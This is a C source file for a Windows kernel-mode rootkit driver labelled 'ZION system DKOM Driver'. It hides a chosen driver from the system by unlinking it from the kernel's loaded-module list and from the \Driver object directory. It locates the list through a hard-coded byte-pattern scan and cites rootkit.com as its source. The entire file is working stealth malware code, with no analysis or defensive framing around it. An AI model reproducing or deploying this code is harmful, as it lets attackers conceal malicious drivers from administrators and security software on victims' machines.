/*
 *      name: ZION system DKOM Driver kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_dkom_module_impl.h"


BOOL DKOM_MODULE_SERVER(PVOID ptrBufferAddr)
{

	PZION_MODULE_ENTRY Zion_PsLoadedModuleList;
	PZION_MODULE_ENTRY Zion_NtModule = NULL;
	PVOID ptrProxyDKOMPacketData = ExAllocatePool(
												PagedPool,
												sizeof(ZION_DKOM_MODULE_CMD_DATA)
												);

	if (NULL == ptrProxyDKOMPacketData)
	{
		safe_trace("ZION_SERVER: alloc memory error.\n");
		return 0;
	}
	if (1 != Safe_CopyMemFromUser((PZION_DKOM_MODULE_CMD_DATA)((PZION_CS_PACKET)ptrBufferAddr)->pData,
						   sizeof(ZION_DKOM_MODULE_CMD_DATA),
						   ptrProxyDKOMPacketData))
	{
		safe_trace("ZION_SERVER: Copy Data error.\n");
		return 0;
	}
	if (FALSE == GetPsLoadedModuleListAddr(&Zion_PsLoadedModuleList))
	{
		safe_trace("ZION_SERVER: Get GetPsLoadedModuleList error\n");
		return 0;
	}
	safe_trace("ZION_SERVER: %x\n",Zion_PsLoadedModuleList);
	Zion_NtModule = Zion_PsLoadedModuleList;
	if (FALSE == DKOM_HideModuleByName(Zion_NtModule,((PZION_DKOM_MODULE_CMD_DATA)ptrProxyDKOMPacketData)->DriverFileName ))
	{
		safe_trace("ZION_SERVER: No pid found, error hiding\n");
		return 0;
	}
	StealthInitializeLateMore(((PZION_DKOM_MODULE_CMD_DATA)ptrProxyDKOMPacketData)->DriverFileName);
	ExFreePool(ptrProxyDKOMPacketData);
	return 1;
}

BOOL DKOM_HideModuleByName(PZION_MODULE_ENTRY ptrNt, WCHAR *FileName)
{
	PZION_MODULE_ENTRY ptrPrev = NULL;
	PZION_MODULE_ENTRY ptrCurr = NULL;
	PZION_MODULE_ENTRY ptrNext = NULL;
	PMDL ptrCurrModuleMDL;
	PMDL ptrPrevModuleMDL;
	PMDL ptrNextModuleMDL;
	BOOL flag = 0;
	UNICODE_STRING wcsHideFileName;
	if (NULL == ptrNt)
	{
		safe_trace("ZION_SERVER: error argu in DKOM_HideProcessByPid\n");
		return 0;
	}
	RtlInitUnicodeString (&wcsHideFileName, 
						  FileName);

	ptrCurr = ptrNt;
	while (flag == 0 || ptrCurr != ptrNt)
	{
		flag = 1;
		ptrCurrModuleMDL = IoAllocateMdl(ptrCurr, 
			4096, 
			FALSE, 
			FALSE, 
			NULL); 

		if(!ptrCurrModuleMDL) 
		{ 
			safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
			return -1; 
		} 
		
		MmProbeAndLockPages(ptrCurrModuleMDL,
			KernelMode,
			IoModifyAccess
			);
		
		if ( 0 == RtlCompareUnicodeString(
									&wcsHideFileName,
									&(ptrCurr->driver_Name),
									TRUE
									))
		{

			ptrPrev = (PZION_MODULE_ENTRY)ptrCurr->ModuleLink.Blink;
			ptrPrevModuleMDL = IoAllocateMdl(ptrPrev, 
				4096, 
				FALSE, 
				FALSE, 
				NULL); 
			if(!ptrPrevModuleMDL) 
			{ 
				safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
				return -1; 
			}
			MmProbeAndLockPages(ptrPrevModuleMDL,
				KernelMode,
				IoModifyAccess
				);
			ptrPrev->ModuleLink.Flink = ptrCurr->ModuleLink.Flink;
			if (NULL != ptrCurr->ModuleLink.Flink)
			{
				ptrNext = (PZION_MODULE_ENTRY)ptrCurr->ModuleLink.Flink;
				ptrNextModuleMDL = IoAllocateMdl(ptrNext, 
													4096, 
													FALSE, 
													FALSE, 
													NULL); 
				if(!ptrNextModuleMDL) 
				{ 
					safe_trace("ZION_SERVER: AllocMdl ERROR.\n");
					return -1; 
				}
				MmProbeAndLockPages(ptrNextModuleMDL,
										KernelMode,
										IoModifyAccess
										);
				ptrNext->ModuleLink.Blink = (PLIST_ENTRY)ptrPrev;
				MmUnlockPages(ptrNextModuleMDL);
				IoFreeMdl(ptrNextModuleMDL);
			}
			MmUnlockPages(ptrPrevModuleMDL);
			IoFreeMdl(ptrPrevModuleMDL);
			break;
		}
		ptrCurr = (PZION_MODULE_ENTRY)ptrCurr->ModuleLink.Flink;
		MmUnlockPages(ptrCurrModuleMDL);
		IoFreeMdl(ptrCurrModuleMDL);
	}
	if (ptrCurr == ptrNt) return FALSE;
	else 
	{
		MmUnlockPages(ptrCurrModuleMDL);
		IoFreeMdl(ptrCurrModuleMDL);
		return TRUE;
	}

}

BOOL GetPsLoadedModuleListAddr(PZION_MODULE_ENTRY *Head)
{
	PVOID ptrKeCapturePersistentThreadState;
	UNICODE_STRING  wcsKeCapturePersistentThreadState;
	int dwBytePassed;
	BYTE * ptrCurrent;
	RtlInitUnicodeString (&wcsKeCapturePersistentThreadState, 
						  L"KeCapturePersistentThreadState");

	ptrKeCapturePersistentThreadState = MmGetSystemRoutineAddress( &wcsKeCapturePersistentThreadState);
	for (dwBytePassed = 0, ptrCurrent = (BYTE *)ptrKeCapturePersistentThreadState; dwBytePassed < 4096 ;dwBytePassed++ ,ptrCurrent++)
	{
		if ((*ptrCurrent == 0xA1) && (*(ptrCurrent+8) ==0xc7) && (*(ptrCurrent+9) ==0x43)
			&& (*(ptrCurrent+0xa) ==0x18) && (*(ptrCurrent+0xf) ==0xc7) && (*(ptrCurrent+0x10) ==0x43) 
			&& (*(ptrCurrent+0x11) ==0x1c))
		break;
	}
	if (dwBytePassed == 4096) return FALSE;
	*Head =  *(PZION_MODULE_ENTRY *)(*(DWORD *)(ptrCurrent + 0xB));
	return TRUE;
}
/*
* Reference: http://www.rootkit.com/newsread.php?newsid=209
*
* Function: Remove the Hash Structure Link in \Drivers Directory Object
*/
VOID StealthInitializeLateMore(WCHAR *FileName)
{
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING ucName;
    NTSTATUS Status;
    HANDLE hDirectory = NULL;
    POBJECT_DIRECTORY pDirectoryObject = NULL;
    KIRQL OldIrql;
    POBJECT_HEADER ObjectHeader;
    POBJECT_HEADER_NAME_INFO NameInfo;
    POBJECT_DIRECTORY_ENTRY DirectoryEntry;
    POBJECT_DIRECTORY_ENTRY DirectoryEntryNext;
    POBJECT_DIRECTORY_ENTRY DirectoryEntryTop;
    ULONG Bucket = 0;
    UNICODE_STRING ObjectName;
	UNICODE_STRING TargetHideName;
    BOOLEAN found = FALSE;
	WCHAR tmpFile[100];
	wcsncpy(tmpFile, FileName, wcslen(FileName) - 4 );
	tmpFile[wcslen(FileName) - 4] = (WCHAR)0;
	RtlInitUnicodeString(&TargetHideName, tmpFile);
    RtlInitUnicodeString(&ucName,L"\\Driver");
    InitializeObjectAttributes(&ObjectAttributes,&ucName,OBJ_CASE_INSENSITIVE,NULL,NULL);
    Status = ObOpenObjectByName(&ObjectAttributes,NULL,KernelMode,NULL,0x80000000,NULL,&hDirectory);
	
    if (!NT_SUCCESS (Status))
        goto __exit;
    
    Status = ObReferenceObjectByHandle(hDirectory,FILE_ANY_ACCESS,NULL,KernelMode,&pDirectoryObject,
        NULL);
    if (!NT_SUCCESS (Status))
        goto __exit;
    
    KeRaiseIrql(APC_LEVEL,&OldIrql);

    for (Bucket=0; Bucket<NUMBER_HASH_BUCKETS; Bucket++) 
    {
        if (found)
            break;

        DirectoryEntry = pDirectoryObject->HashBuckets[Bucket];
        if (!DirectoryEntry)
            continue;
        ObjectHeader = OBJECT_TO_OBJECT_HEADER( DirectoryEntry->Object );
        NameInfo = OBJECT_HEADER_TO_NAME_INFO( ObjectHeader );
        
        if (NameInfo != NULL) 
        {
            ObjectName = NameInfo->Name;
           
            
            if (0 == RtlCompareUnicodeString(&ObjectName,&TargetHideName,TRUE))
            {
                DirectoryEntryTop = pDirectoryObject->HashBuckets[Bucket];
                DirectoryEntryNext = DirectoryEntryTop->ChainLink;
                

                pDirectoryObject->HashBuckets[Bucket] = DirectoryEntryNext;
                DirectoryEntryTop = pDirectoryObject->HashBuckets[Bucket];
                
               
                found = TRUE;

                break;
            }
        } 
        
        DirectoryEntryNext = DirectoryEntry->ChainLink;

        while (DirectoryEntryNext) 
        {
            ObjectHeader = OBJECT_TO_OBJECT_HEADER( DirectoryEntryNext->Object );
            NameInfo = OBJECT_HEADER_TO_NAME_INFO( ObjectHeader );
            
            if (NameInfo != NULL) 
            {
                ObjectName = NameInfo->Name;
                
                if (0 == RtlCompareUnicodeString(&ObjectName,&TargetHideName,TRUE)) //判断是否为待隐藏进程
                {
                    DirectoryEntry->ChainLink = DirectoryEntryNext->ChainLink;
                    
                    found = TRUE;

                    break;
                }
            } 

                    if (DirectoryEntry)
                {
                DirectoryEntry = DirectoryEntry->ChainLink;
                DirectoryEntryNext = DirectoryEntry->ChainLink;
            }
            else
            {
                DirectoryEntryNext = NULL;
            }
        }
    }

    KeLowerIrql(OldIrql);
__exit:
    if (pDirectoryObject)
        ObDereferenceObject(pDirectoryObject);
    if (hDirectory)
        ZwClose (hDirectory);
    return;
}

